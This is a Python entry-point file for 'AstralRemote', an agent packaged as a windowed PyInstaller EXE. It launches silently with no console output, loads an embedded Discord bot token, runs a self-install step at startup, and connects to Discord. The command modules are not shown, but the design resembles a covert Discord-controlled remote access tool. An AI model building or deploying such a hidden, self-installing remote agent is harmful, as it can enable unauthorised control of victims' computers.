# AstralRemote production entry. Runs headless inside the windowed
# PyInstaller EXE: no banner, no menu, no prompts, no console output on
# ordinary launch. Token and settings come from the generated embedded
# payload module only. Fatal startup problems go to the sanitized file
# log. Early diagnostic commands (--version, --self-test) dispatch before
# the Discord client or payload imports load. Standard streams may be
# None under --noconsole; exit codes are the primary signal.

from __future__ import annotations

import asyncio
import signal
import sys
from typing import Any

EXIT_OK = 0
EXIT_GENERAL = 1
EXIT_NO_PAYLOAD = 2
EXIT_BAD_CONFIG = 3
EXIT_BAD_TOKEN = 4
EXIT_AUTH_REJECTED = 5
EXIT_SUBSYSTEM_MISMATCH = 6

VERSION = "0.1.0"


def _safe_write(text: str) -> None:
    stream = sys.stdout
    if stream is None:
        return
    try:
        stream.write(text + "\n")
    except (OSError, ValueError, AttributeError):
        pass


def _flag_value(argv: list[str], flag: str):
    if flag in argv:
        index = argv.index(flag)
        if index + 1 < len(argv):
            return argv[index + 1]
    return None


def handle_version(argv: list[str]) -> bool:
    """Print version without connecting. Returns True when handled."""
    if "--version" in argv or "-v" in argv:
        _safe_write(f"AstralRemote-Agent v{VERSION}")
        return True
    return False


def handle_self_test(argv: list[str]) -> int:
    """Validate the embedded payload without logging in. Returns an exit code."""
    from astral_remote.agent import payload as payload_mod

    try:
        found = payload_mod.load_embedded_payload()
    except FileNotFoundError:
        _write_report(argv, {"status": "no-payload", "version": VERSION,
                             "payload_present": False, "config_valid": False})
        return EXIT_NO_PAYLOAD
    except Exception as exc:  # noqa: BLE001 - mapped to documented codes, never re-raised with secrets
        message = str(exc)
        code = EXIT_BAD_TOKEN if "token" in message.lower() else EXIT_BAD_CONFIG
        _write_report(argv, {"status": "invalid", "version": VERSION,
                             "payload_present": True, "config_valid": False})
        return code
    _write_report(argv, {"status": "ok", "version": found["config"].get("agentVersion", VERSION),
                         "payload_present": True, "config_valid": True})
    _safe_write("payload-ok")
    return EXIT_OK


def _write_report(argv: list[str], data: dict) -> None:
    """Write a non-secret status report to a parent-created temp file.

    Applies the restricted contract: absolute path, expected temp dir,
    expected basename prefix, pre-existing empty regular file, no
    symlink. Any validation failure silently skips the report.
    """
    import json
    import os

    path = _flag_value(argv, "--self-test-report")
    if not path:
        return
    try:
        import tempfile

        expected_dir = os.path.realpath(tempfile.gettempdir())
        real = os.path.realpath(os.path.abspath(path))
        if os.path.dirname(real) != expected_dir:
            return
        if not os.path.basename(real).startswith("remote-selftest-"):
            return
        if not os.path.isfile(real) or os.path.islink(real):
            return
        if os.path.getsize(real) != 0:
            return
        with open(real, "r+b") as handle:
            handle.write((json.dumps(data) + "\n").encode("utf-8"))
            handle.flush()
            try:
                os.fsync(handle.fileno())
            except OSError:
                pass
    except OSError:
        pass


async def run_agent(token: str, config: dict, start=None) -> Any:
    """Run the agent with an in-memory token. Token never logged or stored."""
    from astral_remote.agent.connection import is_fatal_auth_error, login_with_backoff
    from astral_remote.agent.discord_bot import start_bot

    if not isinstance(token, str) or token.strip() == "":
        raise ValueError("Empty token rejected.")
    starter = start if start is not None else (lambda: start_bot(config, token.strip()))
    try:
        client = await login_with_backoff(starter)
    except Exception as err:
        if is_fatal_auth_error(err):
            raise RuntimeError("Discord rejected the embedded token. Rebuild the EXE with a fresh token.") from err
        raise
    loop = asyncio.get_running_loop()

    async def shutdown() -> None:
        await client.close()

    for signame in ("SIGINT", "SIGTERM"):
        try:
            loop.add_signal_handler(getattr(signal, signame), lambda: asyncio.ensure_future(shutdown()))
        except (NotImplementedError, RuntimeError, OSError):
            pass
    return client


async def main(argv=None) -> int:
    args = list(sys.argv[1:] if argv is None else argv)
    if handle_version(args):
        return EXIT_OK
    if "--self-test" in args:
        return handle_self_test(args)
    from astral_remote.agent import payload as payload_mod

    try:
        found = payload_mod.load_embedded_payload()
    except Exception as exc:
        await _log_fatal_async(str(exc))
        return EXIT_NO_PAYLOAD if isinstance(exc, FileNotFoundError) else EXIT_BAD_CONFIG
    from astral_remote.agent.startup import apply_self_install

    apply_self_install(found["config"])
    try:
        await run_agent(found["token"], found["config"])
        await asyncio.Event().wait()
        return EXIT_OK
    except RuntimeError as exc:
        await _log_fatal_async(str(exc))
        return EXIT_AUTH_REJECTED
    except Exception as exc:  # noqa: BLE001 - sanitized into the file log
        await _log_fatal_async(str(exc))
        return EXIT_GENERAL


async def _log_fatal_async(message: str) -> None:
    from astral_remote.agent.error_log import log_fatal

    try:
        result = log_fatal(message)
        if asyncio.iscoroutine(result):
            await result
    except Exception:
        pass


def entry() -> None:
    """Console entry used by PyInstaller and python -m. Exits with the status code."""
    try:
        code = asyncio.run(main())
    except KeyboardInterrupt:
        code = EXIT_OK
    raise SystemExit(code)


if __name__ == "__main__":
    entry()
